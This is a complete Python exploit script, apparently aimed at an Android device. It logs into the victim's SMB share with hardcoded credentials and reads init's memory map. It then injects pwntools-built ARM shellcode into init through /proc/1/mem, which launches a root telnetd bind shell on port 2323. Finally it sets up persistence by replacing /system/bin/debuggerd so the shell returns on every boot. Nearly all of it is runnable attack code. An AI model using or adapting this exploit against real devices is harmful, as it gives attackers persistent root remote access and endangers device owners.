print('requirements:')
print('1. (victim)   SMB is turned on under the WIFI settings.')
print("2. (victim)   Debugging is enabled in 'Developer options'.")
print("3. (attacker) ADB")
print("4. (attacker) impacket (python package)")
print("5. (attacker) pwntools (python package)")
print("6. (attacker) compiler for armhf (arm-linux-gnueabihf-gcc).")

ip = input("victim IP: ")
share = "u9-h"
smb_name = 'root'
smb_pass = '123'

from impacket.smbconnection import SMBConnection, FILE_SHARE_READ, FILE_SHARE_WRITE
print('connecting to SMB server: ')
print('  ip:    ' + ip)
print('  share: ' + share)
print('  uesr:  ' + smb_name)
print('  pass:  ' + smb_pass)
conn = SMBConnection(ip, ip)
conn.login(smb_name, smb_pass)
treeid = conn.connectTree(share)

print(f"openning '\\\\{ip}\\{share}\\proc\\1\\maps'...")
mapsid = conn.openFile(treeid, '\\proc\\1\\maps')
maps = (conn.readFile(treeid, mapsid)+b'\n').split(b'\n')
conn.closeFile(treeid, mapsid)

initbase = 0xFFFFFFFF

for line in maps:
    if line.find(b'/init') != -1 and line.find(b'r-xp') != -1:
        initbase = int(line[0:8], 16)
        break

if initbase == 0xFFFFFFFF: 
    print(f"couldn't find the executable map of 'init' using: '\\\\{ip}\\{share}\\proc\\1\\maps'")
    exit()

print(f"the executable map of 'init' starts at: {hex(initbase)}")

from pwn import *

print("constructing shellcode...")

context.arch = 'thumb'

# save state
shell = '''
    push {r0,r1,r2,r3,r5,r6,r7,r8,LR}
    mov r8, sp
'''
# check for the mark indicating that telnetd have already been started
shell += '''
    mov.w r1, #'''+hex(initbase)+'''
    ldr r0, [r1, #0]
    ldr r1, =0x464c457f
    cmp r0, r1
    bne label_end
'''
# starting telnetd in subprocess
shell += shellcraft.fork()
shell += '''
    cmp r0, 0
    bne label_end
'''
shell += shellcraft.execve('/system/xbin/telnetd', ['/system/xbin/telnetd', '-b', '0:2323', '-l', 'sh'], [])
# restore state
shell += '''
label_end:
    mov sp, r8
    pop {r0,r1,r2,r3,r5,r6,r7,r8,LR}
'''
# continue the execution - jump to epoll_wait (0x0005D768) in thumb mode (0x0005D768+1)
shell += '''
    ldr pc, ='''+hex(0x0005D769-0x8000+initbase)+'''
'''

shell = asm(shell)

print(f'shellcode (length: {str(len(shell))}):')
print(shell)

print(f"openning '\\\\{ip}\\{share}\\proc\\1\\mem'")
# injecting shell to "init"
memid = conn.openFile(treeid, '\\proc\\1\\mem', shareMode = FILE_SHARE_READ | FILE_SHARE_WRITE)
# overwrite functions that are never used
conn.writeFile(treeid, memid, shell, 0x000852A8-0x8000+initbase)
# overwrite call to epoll_wait in main
conn.writeFile(treeid, memid, b'\x77\xf0\x6a\xfd', 0x0000D7D0-0x8000+initbase) # BL 0x000852A8

print('finished injecting the shellcode')

print("triggering the injection (with adb) by sending SIGCHLD signal to 'init'...")
from subprocess import Popen, call, PIPE

# triggering the injection by sending a SIGCHLD signal to init
call(['adb', 'disconnect'])
call(['adb', 'connect', ip])
p1 = Popen(['adb', 'shell'], stdin=PIPE, stdout=PIPE)
p1.stdin.write(b'sh\necho $$\nsh\necho $$\n')
p1.stdin.flush()
sleep(1.5) # wait for output to arrive
out = p1.stdout.peek().replace(b'\r', b'').split(b'\n')
pid1 = 0
pid2 = 0
for line in out:
    try:
        pid = int(line)
    except:
        pid = 0
    if pid != 0 and pid1 == 0:
        pid1 = pid
        print("parent PID: " + str(pid1))
        continue
    if pid != 0 and pid1 != 0:
        pid2 = pid
        print("child PID: " + str(pid2))
        break

if pid1 == 0 or pid2 == 0:
    print("couldn't get 2 PIDs of direct parent-child processes.\nplease provide manually.")
    pid1 = input("pid (parent) : ")
    pid2 = input("pid (child)  : ")

print("killing parent...")
call(['adb', 'shell', 'kill', '-9', str(pid1)], stdin=PIPE, stdout=PIPE)
print("killing child...")
call(['adb', 'shell', 'kill', '-9', str(pid2)], stdin=PIPE, stdout=PIPE)

p1.kill()

# put a mark at the base of the executable section to make sure the execve section in the sellcode is not spammed
conn.writeFile(treeid, memid, b'\x7fPWN', initbase) # BL 0x000852A8
conn.closeFile(treeid, memid)
conn.disconnectTree(treeid)
conn.logoff()
conn.close()

# setting up persistence
# the binary 'debuggerd' is started as root during boot, by replacing it we can achieve persistence across device reboots.
print('connecting to temporary root telnetd server...')
p2 = Popen(['telnet',ip,'2323'], stdin=PIPE, stdout=PIPE)
print('setting up persistence...')
sh = b'''
mount -o remount,rw /dev/block/system /system
cp -n /system/bin/debuggerd /system/bin/debuggerd-real
rm /system/bin/debuggerd
echo "#!/system/bin/sh" > /system/bin/debuggerd
echo "telnetd -b 0:2323 -l sh" >> /system/bin/debuggerd
chown root:shell /system/bin/debuggerd
chmod 755 /system/bin/debuggerd
chcon u:object_r:debuggerd_exec:s0 /system/bin/debuggerd
mount -r -o remount /dev/block/system /system
exit
'''
p2.stdin.write(sh)
p2.stdin.flush()
p2.stdout.read()

print('finished :)')

from os import system
system(f"telnet {ip} 2323")